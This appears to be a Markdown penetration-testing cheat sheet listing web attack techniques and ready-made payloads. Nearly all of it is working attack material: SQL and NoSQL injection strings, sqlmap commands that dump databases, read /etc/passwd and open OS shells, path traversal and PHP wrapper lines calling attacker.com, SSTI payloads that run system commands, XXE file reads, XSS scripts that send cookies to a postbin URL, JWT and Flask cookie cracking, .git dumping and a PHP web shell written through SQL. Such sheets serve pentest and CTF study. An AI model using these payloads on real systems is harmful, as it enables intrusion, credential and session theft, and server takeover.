# INDEX
---
- [Discovery Tool](#discovery-tool)
- [NoSQl Injection](#nosql-injection)
- [SQL Injection](#sql-injection)
- [Path traversal (LFI)](#path-traversal-lfi)
- [SSTI](#ssti)
- [XML external entity (XXE)](#xml-external-entity-xxe)
- [XSS Injection](#xss-injection)
- [Server Side XSS](#server-side-xss)
- [Cookies](#cookies)
- [Request](#request)
- [Download .git](#download-git)
- [CMS](#cms)
- [Certificate](#certificate)
- [PhpMyAdmin](#phpmyadmin)

### Useful wordlist

| Name                      | Path                                                                    |
|:--------------------------|:------------------------------------------------------------------------|
| SecList DNS               | `/usr/share/seclists/Discovery/DNS/namelist.txt`                        |
| SecList WPA2 pass         | `/usr/share/seclists//Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt`   |
| SecList top1000 pass      | `/usr/share/seclists//Passwords/xato-net-10-million-passwords-10000.txt`|                     |
| Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |
| Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |
| Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |

### Interesting extensions

| Type    | Extension            |
|:--------|:---------------------|
| Script  | `php,js,asp,apsx`    |
| Text    | `html,txt,md`        |
| Data    | `json,csv,xls,xlsx`  |
| DB      | `db,sqlite`          |
| Linux   | `sh,bin`             |
| Windows | `ps1,exe`            |
| Config  | `config,conf,bak,old`|
| HTAccess| `htaccess`           |

# Discovery tools
### CeWL
> A [tool](https://www.kali.org/tools/cewl/) to create a wordlist from a site to use it for password dictionary attack.

```bash
cewl -d 5 -e --with-numbers http://exampledomain.com/

-d (depth) allows 5 levels of subdomains
-e (email) includes email in the list 
--with-numbers allows numbers in the list 
```

### ffuf
> A [tool](https://www.kali.org/tools/ffuf/) to fuzz subdomains, vhosts, POST params & datas, etc
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://exampledomain.com/FUZZ'
```

### Gobuster
> A [tool](https://www.kali.org/tools/gobuster/) to enumerate domain.
```bash
gobuster dir -u http://exampledomain.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -x html,php
```

### Dirb
> A classic [tool](https://www.kali.org/tools/dirb/) to enumerate website
```bash
dirb http://exampledomain.com -R
```

### Dirsearch
*(Best one)*
> A [tool](https://www.kali.org/tools/dirsearch/) lighter and quicker than any other
```bash
dirsearch -u http://exampledomain.com -e html,js,php -t 100 -r
```


# Nosql Injection
> NoSQL DBs don't stock informations on tables so the syntax is different.
> Well-Known NoSQL DB : MongoDB, Redis, ElasticSearch

### Common Pattern
```
' || 1==1 %00
' || 1==1 //
{ $ne: 1 }
true, $where: '1 == 1'
'; return 1 %00
```

### Form
```
username[$ne]=lol$password[$ne]=lol
username[$regex]=.*$password[$regex]=.*
username[$eq]=admin&password[$eq]=admin
```

### JSON
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$eq": "admin"}, "password": {"$ne": "admin"}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

# SQL Injection
> SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
> It generally allows an attacker to view data that they are not normally able to retrieve. - [Source](https://portswigger.net/web-security/sql-injection)

## Manual
### Common pattern
```
" OR ""="
' OR ''='
' OR 1=1 -- comment
OR 1=1
*
```

### Comment
```
-- comment
# comment
/* comment */
/*! comment */
```

### INSERT
```
admin", "") ON DUPLICATE KEY UPDATE password="newpasswd";
```
- [INSERT DUPLICATE KEY](https://mariadb.com/kb/en/insert-on-duplicate-key-update/)


### Separator
```
" UNION SELECT * FROM users
" ; SELECT * FROM users
```

## SQLmap
> [SQLmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage) is a tool that automates the process of detecting and exploiting SQL injection.

### Discovery
```bash
sqlmap --u 'http://exampledomain.com/index.php?param=*'
# If you know info
sqlmap  -u 'http://exampledomain.com/index.php?param=*' --os <os> --dbms <type db> --technique <tech>
```

- [List OS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-database-management-system-operating-system-name)
- [List DBMS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-dbms)
- [List Techniques](https://github.com/sqlmapproject/sqlmap/wiki/Usage#sql-injection-techniques-to-test-for)

### Get DB
```bash
# List databases
sqlmap -u 'http://exampledomain.com/index.php?param=*' --predict-output --dbs
# List Tables
sqlmap -u 'http://exampledomain.com/index.php?param=*' --predict-output --tables -D db
# Dump Table
sqlmap -u 'http://exampledomain.com/index.php?param=*' --predict-output --dump -D db -T table 
# Dump Column(s)
sqlmap -u 'http://exampledomain.com/index.php?param=*' --predict-output --dump -D db -T table -C column
```

### List Privileges
```bash
sqlmap -u 'http://exampledomain.com/index.php?param=*' --current-user
sqlmap -u 'http://exampledomain.com/index.php?param=*' --privileges
sqlmap -u 'http://exampledomain.com/index.php?param=*' --roles
```

### File
```bash
# Read file
sqlmap -u 'http://exampledomain.com/index.php?param=*' --file-read=/etc/passwd
# Upload file
sqlmap -u 'http://exampledomain.com/index.php?param=*' --file-write=/local/file --file-dest=/dest/path
```

### Shell
```bash
# Upload Reverse shell
sqlmap -u 'http://exampledomain.com/index.php?param=*' --os-shell
sqlmap -u 'http://exampledomain.com/index.php?param=*' --os-cmd 'echo desbarres'
# Sql Shell
sqlmap -u 'http://exampledomain.com/index.php?param=*' --sql-shell
```

### Optimize
```
-o                  Turn on all optimization switches
--predict-output    Predict common queries output
--keep-alive        Use persistent HTTP(s) connections
--null-connection   Retrieve page length without actual HTTP response body
--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
```

### Turbo SQLmap
```bash
sqlmap -u 'http://exampledomain.com/index.php?param=*' --dump -T table_example -D example_db --level=2 --force-ssl --time-sec 1 --predict-output --dbms 'MySQL' --technique T  --flush-session
```

# Path traversal (LFI)
> A path traversal attack aims to access files and directories that are stored outside the web root folder by manipulating variables that reference files.
> It may be possible to access arbitrary files and directories including application source code or configuration and critical system files.

### Pattern
> Try to add `%00` at the end of your payload.

```
..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252e%252e%252e%252fetc%252fpasswd%00
```
```
../
ï¸°/
..%252f/
..%2f
%2e%2e%2f
%2e%2e/
%2e%2e%5c
..%5c
%252e%252e%255c
..%255c
..%c0%af
```

- [Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
- [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [Hacktricks LIF/RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

### PHP pattern
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=http://attacker.com/reverse.php
php://filter/resource=/etc/passwd
zip://path/to/file.zip%23shell.php
http://attacker.com/reverse.php%00
```

- [PHP LFI](https://ruuand.github.io/Local_File_Include/)

# SSTI
> Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection.
> Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE).
> [source](https://portswigger.net/research/server-side-template-injection)

## Manual
### Test
```
#Polyglot SSTI
${{<%[%'"}}%\.
```
```
{{1+1}}
${1+1}
<%= 1+1 %>
${{1+1}}
#{1+1}
@(1+2)
```
![0_pJf0zn5ChHY9X8sF-1-png-1](https://github.com/erwann-rch/Pentest-Tool-List/assets/52162856/8b72a112-bc21-4468-a5b0-94ebe837e74c)

### Nunchucks (Nodejs)
```
{{range.constructor("console.log(123)")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Python (Jinja2)
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Golang
```
{{.}}
```

- [PayloadsAllTheThings - STTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
- [SSTI payloads](https://github.com/payloadbox/ssti-payloads)

## Automated
> [Tplmap](https://github.com/epinna/tplmap) is a tool to perform automated SSTI detection and exploitation
```bash
tplmap.py -u 'http://exampledomain.com/index.php?param=*'
```

# XML external entity (XXE)
> XML external entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
> It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. - [source](https://portswigger.net/web-security/xxe)

## Manual
### Read File
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```

### Get Link
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/path">
]>
<foo>Hello &file;</foo>
```

## Automated
> [XXEinjector](https://github.com/enjoiz/XXEinjector) is a tool to perform automated XXE.
```bash
# Enumerating /etc directory in HTTPS application
XXEinjector.rb --host=10.10.10.10 --path=/etc --file=/tmp/req.txt --ssl
```
# XSS Injection
> XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.
> [source](https://en.wikipedia.org/wiki/Cross-site_scripting)

### Script
```html
<script>window.open('https://www.toptal.com/developers/postbin/123-123?' + document.cookie);</script>
```
```html
<script>document.location = 'https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie);</script>
```
```html
<script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
```

### Meta
```html
<meta http-equiv="refresh" content="0;url=http://example.com">
```

### Object
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### Useful Link
- [Toptal/postbin - Exfiltrate information](https://www.toptal.com/developers/postbin/)
- [Generate Tags](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [CSP Evalutor](https://csp-evaluator.withgoogle.com/)
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)

# Server Side XSS
> Server XSS occurs when untrusted user supplied data is included in an HTTP response generated by the server.
> In this case, the entire vulnerability is in server-side code, and the browser is simply rendering the response and executing any valid script embedded in it.
> [source](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

### Dynamic PDF
```xml
<iframe src=file:///etc/passwd></iframe>
<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///etc/passwd">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id="portal">
<svg-dummy></svg-dummy><iframe src='file:///etc/passwd' width='100%' height='1000px'></iframe><svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>
```
```xml
<annotation file="/etc/passwd" content="/etc/passwd" icon="graph" title="Attached File: /etc/passwd" pos-x="195" />
```

# Cookies
> Cookies can be hijack by different way.
> **Sign cookies** can be decode to find vulnerable informations or bruteforce to find secret in order to create your own cookies.
> Other type of cookies need to be steal to hijack session.

## Flask
> Flask cookies are sign cookie so you can decode it or bruteforce the secret.

### Decode
```bash
pip3 install flask-unsign
flask-unsign --decode --cookie 'eyJ1c2VyIjoiYWRtaW4ifQ.Y4za7g.ZHmbIsx0-wdFV_IgyWI7MruY9OY'
```

### Bruteforce
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --no-literal-eval --cookie 'eyJ1c2VyIjoiYWRtaW4ifQ.Y4za7g.ZHmbIsx0-wdFV_IgyWI7MruY9OY'
```

### Encode
```bash
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'mySecret'
```

## Json Web Token (JWT)
> A JWT comes in this structure:
> `AAAAAA.BBBBBB.CCCCCC`.
> AAAAAA represents the header, BBBBBB represents the payload while CCCCCC represents the signature.
> 
> The most common algorithms for signing JWTs are:
> - HMAC + SHA256 (HS256)
> - RSASSA-PKCS1-v1_5 + SHA256 (RS256)
> - ECDSA + P-256 + SHA256 (ES256)
>
> [Source](https://krevetk0.medium.com/brute-forcing-jwt-token-hs256-6f545d24c7c3)

### Encode / Decode
- [JWT.io](https://jwt.io/)

### Brute Force
> [JWTcrack](https://github.com/Sjord/jwtcrack) is a tool to crack JWT tokens.
```bash
pip install PyJWT tqdm
jwtcrack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.Fw4maeqOtL8pPwiI2_VzYBo4JQ91P1Ow3X3hNqx2wPg" /usr/share/wordlists/rockyou.txt
```
```bash
jwt2john "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.Fw4maeqOtL8pPwiI2_VzYBo4JQ91P1Ow3X3hNqx2wPg"
```
```bash
# Use it with hashcat rule : [d3adhob0](https://github.com/praetorian-inc/Hob0Rules)
hashcat -r d3adhob0.rule /usr/share/wordlists/rockyou.txt --stdout | jwtcrack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.Fw4maeqOtL8pPwiI2_VzYBo4JQ91P1Ow3X3hNqx2wPg"
```

# Request
> Different tool to make a http request.

### Curl
```bash
curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' -sd 'username=login&password=pass'
```
```bash
curl -X POST https://example.com/api/submit -H "Content-Type: application/json" -sd '{"email":"lol@lol.com"}'
```

### Python
```python
import requests

# GET
requests.get('http://example.com')
# POST
requests.post('http://example.com/api/submit',
    headers={
        'Content-type': 'raw',
    },
    data={'user': 'guest'},
)
```

### Javascript
```javascript
//  GET
fetch('http://example.com/api/submit',{
    method: 'GET',
})

// POST
fetch('http://example.com/api/submit',{
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({data: 'lol'})
})
```

# Download .git
```bash
wget -r  http://url/.git/
```

> - [GitHacker](https://github.com/WangYihang/GitHacker) is a tool to download without damaging a .git
```bash
githacker --url http://url/.git/ --output-folder result
```

> - [GitTools](https://github.com/internetwache/GitTools/) is tools to perform git research on a website.
```bash
gitfinder.py -i INPUTFILE -t 50
gitdumper.sh  http://url/.git/ outputdir
extractor.sh inputdir outputdir
```

# CMS
### Scaning
> [WPScan](https://www.kali.org/tools/wpscan/) is a tool to scan a target WordPress URL and enumerate any plugins that are installed
```bash
wpscan --force update -e --url http://url --disable-tls-checks
```

# Certificate
```
curl  http://url/ --key KEY.key --cert CERT.cert
```

# PhpMyAdmin
### Quick Shellcode
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```
